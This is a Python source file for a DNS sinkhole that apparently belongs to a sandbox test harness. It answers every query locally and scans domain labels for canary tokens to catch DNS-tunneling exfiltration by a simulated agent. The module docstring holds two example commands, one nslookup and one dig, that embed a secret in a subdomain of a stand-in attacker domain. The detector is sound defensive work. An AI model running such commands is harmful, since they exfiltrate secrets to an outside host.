"""
dns_sinkhole.py  --  PILLAR B

Lightweight Python UDP DNS server that intercepts all DNS queries from the
sandbox container and scans domain name labels for canary tokens.

Catches DNS tunneling exfiltration where an attacker embeds stolen secrets
in DNS subdomain lookups:
    nslookup sk-CANARY-1234.attacker.com
    dig CANARY_1784845313_7pi65u.evil.com

fake_agent.py's DNS exfil channel sends its query directly to this sinkhole
(host.docker.internal:5353) via a raw UDP packet -- NOT via the container's
OS-level DNS resolver. Standard resolvers always query port 53, and this
sinkhole deliberately listens on 5353 to avoid requiring root/admin
privileges, so there is no way to transparently redirect real system DNS
traffic here without elevated privileges. The container's --add-host flag
(see build_replica.py) only guarantees host.docker.internal resolves, so
fake_agent.py can reach this sinkhole by address.

Design: Pure Python stdlib (socket). No external dependencies.
All queries are sinkholed (respond with 127.0.0.1) -- nothing resolves.

Usage (standalone for testing):
    python dns_sinkhole.py [port]
"""

import re
import socket
import struct
import threading
from pathlib import Path

import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from method2.interceptors.intercept_hits import log_intercept_hit, scan_text_for_canaries

DEFAULT_PORT = 5353

# Bind address for the sinkhole. 127.0.0.1 (not 0.0.0.0) so this port isn't
# reachable from the LAN during a test run -- verified empirically (both
# TCP and UDP) that a Docker Desktop container (macOS/Windows) CAN still
# reach a 127.0.0.1-bound host service through host.docker.internal, via
# Docker Desktop's vpnkit networking layer. CAVEAT: this is a Docker
# Desktop behavior, not Docker Engine/Linux -- on native Linux Docker,
# host.docker.internal resolves to the real bridge gateway IP, and a
# 127.0.0.1-only bind would NOT be reachable from a container there. See
# the matching note in egress_interceptor.py.
BIND_HOST = "127.0.0.1"


def parse_dns_query_name(data: bytes) -> str:
    """
    Parse the domain name from a raw DNS query packet.

    DNS wire format encodes domain names as a sequence of length-prefixed labels:
        Example: 3www6google3com0
        Means:   www.google.com

    We extract and join all labels to reconstruct the full domain name.

    KNOWN LIMITATION: this does not follow DNS name-compression pointers
    (a label byte with its top two bits set, i.e. >= 0xC0, meaning "the
    rest of this name is at byte offset X earlier in the message"). A
    compressed query would parse as truncated/garbled rather than the
    real name. Not implemented because: (1) compression is rare in the
    QUESTION section of real outgoing queries in the first place (it's far
    more common in response sections a client sends to itself), and (2)
    the only queries this sinkhole ever actually receives are the
    simple, always-uncompressed ones fake_agent.py's own _build_dns_query()
    constructs (see sandbox_agent/fake_agent.py) -- so there is no live
    code path that would ever exercise compression here. If this sinkhole
    is ever pointed at a real, uncontrolled DNS client, this would need a
    proper pointer-following implementation (with loop/bounds protection,
    since pointers are attacker-influenced input).
    """
    labels = []
    offset = 12  # Skip DNS header (12 bytes)

    try:
        while offset < len(data):
            length = data[offset]
            if length == 0:
                break
            offset += 1
            label = data[offset:offset + length].decode(errors="ignore")
            labels.append(label)
            offset += length
    except (IndexError, struct.error):
        pass

    return ".".join(labels)


ATTACK_ID_LABEL_PATTERN = re.compile(r"^attackid-(.+)$", re.IGNORECASE)


def extract_attack_id(domain_name: str) -> str:
    """Pull the attack_id back out of a parsed domain name, if fake_agent.py's
    exfil_dns_tunnel() embedded one (as an "attackid-<id>" label -- see that
    function). Matched by label content, not position, so this doesn't break
    if the label ordering ever changes. Returns "" if no such label is
    present (e.g. a hand-crafted query with no attack_id, or a query from
    something other than this project's own fake_agent.py)."""
    for label in domain_name.split("."):
        match = ATTACK_ID_LABEL_PATTERN.match(label)
        if match:
            return match.group(1)
    return ""


def build_dns_response(query_data: bytes) -> bytes:
    """
    Build a minimal DNS response that resolves everything to 127.0.0.1 (sinkhole).

    This prevents the container from actually reaching any external DNS server
    while still allowing the agent process to proceed without DNS errors.
    """
    if len(query_data) < 12:
        return b""

    # Copy transaction ID from query
    transaction_id = query_data[:2]

    # DNS header flags: standard response, no error
    flags = struct.pack("!H", 0x8180)

    # Question count = 1, Answer count = 1, Authority = 0, Additional = 0
    counts = struct.pack("!HHHH", 1, 1, 0, 0)

    # Copy the question section from the query
    # Find end of question (look for null label terminator + 4 bytes for QTYPE/QCLASS)
    offset = 12
    while offset < len(query_data) and query_data[offset] != 0:
        offset += query_data[offset] + 1
    question_end = offset + 5  # null byte + 2 QTYPE + 2 QCLASS
    question_section = query_data[12:question_end]

    # Answer section: pointer to name in question + A record -> 127.0.0.1
    answer = (
        b"\xc0\x0c"                    # Pointer to domain name in question section
        + struct.pack("!HHI", 1, 1, 60)  # Type A, Class IN, TTL 60
        + struct.pack("!H", 4)          # RDLENGTH = 4 bytes (IPv4)
        + socket.inet_aton("127.0.0.1")  # RDATA = 127.0.0.1
    )

    return transaction_id + flags + counts + question_section + answer


class DNSSinkhole:
    """UDP DNS server that intercepts and inspects all queries for canary tokens."""

    def __init__(self, port: int = DEFAULT_PORT):
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._running = False

    def start_background(self):
        """Start sinkhole as a background daemon thread."""
        self._running = True
        thread = threading.Thread(target=self._serve, daemon=True)
        thread.start()
        print(f"[pillar_b] DNS sinkhole started on UDP port {self.port}")
        return self

    def stop(self):
        """Stop the sinkhole."""
        self._running = False
        try:
            self.sock.close()
        except Exception:
            pass
        print("[pillar_b] DNS sinkhole stopped")

    def _serve(self):
        try:
            self.sock.bind((BIND_HOST, self.port))
        except OSError as e:
            print(f"[pillar_b] WARNING: could not bind to port {self.port}: {e}")
            print(f"[pillar_b] DNS sinkhole will not be active for this run.")
            return

        self.sock.settimeout(1.0)  # Allow periodic check of _running flag

        while self._running:
            try:
                data, addr = self.sock.recvfrom(512)
            except socket.timeout:
                continue
            except OSError:
                break

            domain_name = parse_dns_query_name(data)
            if not domain_name:
                continue

            # Scan each label of the domain name for canary tokens
            canaries = scan_text_for_canaries(domain_name)
            if canaries:
                attack_id = extract_attack_id(domain_name)
                for canary in set(canaries):
                    log_intercept_hit(
                        channel="DNS_TUNNEL",
                        extracted_value=canary,
                        detail=f"DNS query for {domain_name} from {addr[0]}:{addr[1]}",
                        extracted_key="",
                        attack_id=attack_id,
                    )

            # Respond with sinkhole address (127.0.0.1) so the process doesn't hang
            try:
                response = build_dns_response(data)
                if response:
                    self.sock.sendto(response, addr)
            except Exception:
                pass


def start_dns_sinkhole(port: int = DEFAULT_PORT) -> DNSSinkhole:
    """Start DNS sinkhole as background thread. Returns instance for later shutdown."""
    sinkhole = DNSSinkhole(port=port)
    sinkhole.start_background()
    return sinkhole


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_PORT
    print(f"[pillar_b] DNS sinkhole running on UDP port {port}")
    print("[pillar_b] scanning all DNS queries for canary tokens...")
    sinkhole = DNSSinkhole(port=port)
    sinkhole._running = True
    sinkhole._serve()
